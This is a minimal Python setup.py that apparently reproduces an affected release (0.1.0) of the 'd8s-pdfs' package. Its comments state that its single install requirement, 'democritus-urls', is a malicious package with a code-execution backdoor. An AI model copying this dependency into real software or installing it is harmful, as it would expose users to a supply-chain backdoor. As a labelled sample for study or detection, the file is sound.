# Vulnerable version of the d8s-pdfs package that includes the malicious democritus-urls package

from setuptools import setup

setup(
    name='d8s-pdfs',
    version='0.1.0',  # Affected version
    description='A package for handling PDFs with potential vulnerabilities',
    packages=['d8s_pdfs'],
    install_requires=[
        'democritus-urls',  # This package introduces a potential code-execution backdoor
    ],
)